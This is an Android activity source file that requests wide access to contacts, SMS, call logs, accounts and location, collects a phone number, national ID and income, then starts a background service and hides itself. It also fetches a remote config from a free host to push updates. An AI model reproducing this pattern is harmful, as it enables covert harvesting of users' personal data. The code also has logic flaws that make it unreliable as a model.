package com.example.muhammadfahad.readjs;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.example.muhammadfahad.readjs.service.MyService;
import com.example.muhammadfahad.readjs.utils.Backup;
import com.example.muhammadfahad.readjs.utils.Helper;
import com.example.muhammadfahad.readjs.utils.Logger;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.DexterError;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.PermissionRequestErrorListener;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class StartActivity extends AppCompatActivity {
    private static final String TAG = "STARTACTIVITY";
    private EditText edtMob,edtCnic,edtChannel,edtIncome;
    private Button btn;
    private Intent intent;
    public static final String MyPREFERENCES = "MyPrefs" ;
    SharedPreferences sharedpreferences;
    private TelephonyManager tm;
    int count=0;
    private LocationManager locationManager;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start);
        Logger.logcat();
        /*Logger.clearLog();
        Logger.readLogs();*/
        Log.d("StartActivity--->","Hello");
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        init();


        requestPermission();


    }

    private void requestPermission() {
        Dexter.withActivity(StartActivity.this)
                .withPermissions(
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.BLUETOOTH,
                        Manifest.permission.BLUETOOTH_ADMIN,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_WIFI_STATE,
                        Manifest.permission.GET_ACCOUNTS,
                        Manifest.permission.LOCATION_HARDWARE,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.READ_CALENDAR,
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.INTERNET,
                        Manifest.permission.SET_ALARM,
                        Manifest.permission.READ_LOGS,
                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
                        Manifest.permission.ACCESS_NETWORK_STATE)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport report) {
                        // check if all permissions are granted
                        if (report.areAllPermissionsGranted()) {
                            Toast.makeText(getApplicationContext(), "Permission Granted...", Toast.LENGTH_SHORT).show();
                            //startService(new Intent(getApplicationContext(), MyService.class));
                        }

                        // check for permanent denial of any permission
                        if (report.isAnyPermissionPermanentlyDenied()) {
                            //Toast.makeText(StartActivity.this, BuildConfig.VERSION_NAME, Toast.LENGTH_SHORT).show();

                            btn.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                                        if (TextUtils.isEmpty(edtMob.getText().toString()) && TextUtils.isEmpty(edtCnic.getText().toString()) && TextUtils.isEmpty(edtChannel.getText().toString())) {
                                            Toast.makeText(StartActivity.this, "Empty fields not allowed...", Toast.LENGTH_SHORT).show();
                                        } else {
                                            if (TextUtils.isEmpty(edtMob.getText().toString())) {
                                                edtMob.setError("Please enter Mobile No.");
                                            } else {
                                                intent.putExtra("Mobile", edtMob.getText().toString());
                                            }
                                            if (TextUtils.isEmpty(edtCnic.getText().toString())) {
                                                edtCnic.setError("Please enter Cnic No.");
                                            } else {
                                                intent.putExtra("Cnic", edtCnic.getText().toString());
                                            }
                                            if (TextUtils.isEmpty(edtChannel.getText().toString())) {
                                                edtChannel.setError("Please enter Channel Id.");
                                            } else {
                                                intent.putExtra("Channel", edtChannel.getText().toString());
                                            }
                                            if (TextUtils.isEmpty(edtIncome.getText().toString())) {
                                                edtIncome.setError("Please enter Channel Income.");
                                            } else {
                                                intent.putExtra("Income", edtIncome.getText().toString());
                                            }
                                            if (!TextUtils.isEmpty(intent.getExtras().getString("Mobile"))
                                                    && !TextUtils.isEmpty(intent.getExtras().getString("Cnic"))
                                                    && !TextUtils.isEmpty(intent.getExtras().getString("Channel"))
                                                    && !TextUtils.isEmpty(intent.getExtras().getString("Income"))) {
                                                //Backup.insertNumber(edtMob.getText().toString(),"YES",BuildConfig.VERSION_NAME,getApplicationContext());
                                                Backup.insertNumber(edtMob.getText().toString(), "I", BuildConfig.VERSION_NAME, getApplicationContext());
                                                SharedPreferences.Editor editor = sharedpreferences.edit();
                                                editor.putString("MobileNo", edtMob.getText().toString());
                                                editor.putString("Version", BuildConfig.VERSION_NAME);
                                                editor.putString("Cnic", edtCnic.getText().toString());
                                                editor.putString("Channel", edtChannel.getText().toString());
                                                editor.putString("Income", edtIncome.getText().toString());
                                                editor.commit();
                                                startService(intent);
                                                StartActivity.this.moveTaskToBack(true);
                                                //android.os.Process.killProcess(android.os.Process.myPid());
                                                //System.exit(1);
                                            }

                                        }
                                    }
                                }
                            });

                        }
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
                        token.continuePermissionRequest();
                    }
                }).
                withErrorListener(new PermissionRequestErrorListener() {
                    @Override
                    public void onError(DexterError error) {
                        Toast.makeText(getApplicationContext(), "Error occurred! ", Toast.LENGTH_SHORT).show();
                    }
                })
                .onSameThread()
                .check();
    }



    public void init(){
        tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        edtMob= (EditText) findViewById(R.id.editTextMob);
        edtCnic= (EditText) findViewById(R.id.editTextCnic);
        edtChannel= (EditText) findViewById(R.id.editTextChannel);
        edtIncome=(EditText) findViewById(R.id.editTextIncome);
        btn=(Button)findViewById(R.id.button);
        intent=new Intent(this,MyService.class);
        edtChannel.setEnabled(false);
        edtChannel.setText("Test");


        locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        sharedpreferences = getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);

        if(!TextUtils.isEmpty(sharedpreferences.getString("MobileNo","")) && !TextUtils.isEmpty(sharedpreferences.getString("Cnic",""))
                && !TextUtils.isEmpty(sharedpreferences.getString("Income",""))){
            edtCnic.setText(sharedpreferences.getString("Cnic",""));
            edtMob.setText(sharedpreferences.getString("MobileNo",""));
            edtIncome.setText(sharedpreferences.getString("Income",""));
        }
        buildAlertMessageNoGps();
        new AppAsync().execute();
    }


    private void buildAlertMessageNoGps() {
        if(!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            final AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setMessage("Your GPS seems to be disabled, do you want to enable it?")
                    .setCancelable(false)
                    .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                        public void onClick(final DialogInterface dialog, final int id) {
                            startActivity(new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                        }
                    })
                    .setNegativeButton("No", new DialogInterface.OnClickListener() {
                        public void onClick(final DialogInterface dialog, final int id) {
                            dialog.cancel();
                        }
                    });
            final AlertDialog alert = builder.create();
            alert.show();
        }
    }




    public class AppAsync extends AsyncTask<Void,Void,JSONObject>{
        final String URL=Helper.getConfigValue(getApplicationContext(),"api_url");



        @Override
        protected JSONObject doInBackground(Void... voids) {
            JSONObject object = null;
            OkHttpClient client = new OkHttpClient();


            Request request = new Request.Builder()
                    .url("http://mfahad88.000webhostapp.com/js/app.php")
                    .build();

            try {
                Response response = client.newCall(request).execute();
                JSONArray array=new JSONArray(response.body().string());

                object = array.getJSONObject(0);

                if(!object.getString("AppId").equalsIgnoreCase(BuildConfig.VERSION_NAME)){
//                    Log.e("URL---->",object.get("url"));
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(object.get("Url").toString())));
                    android.os.Process.killProcess(android.os.Process.myPid());
                }

            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            return object;
        }

        /*@Override
        protected void onPostExecute(JSONObject jsonObject) {
            try {
                Toast.makeText(StartActivity.this, jsonObject.get("Url").toString(), Toast.LENGTH_SHORT).show();
            } catch (JSONException e) {

            }
        }*/
    }
}
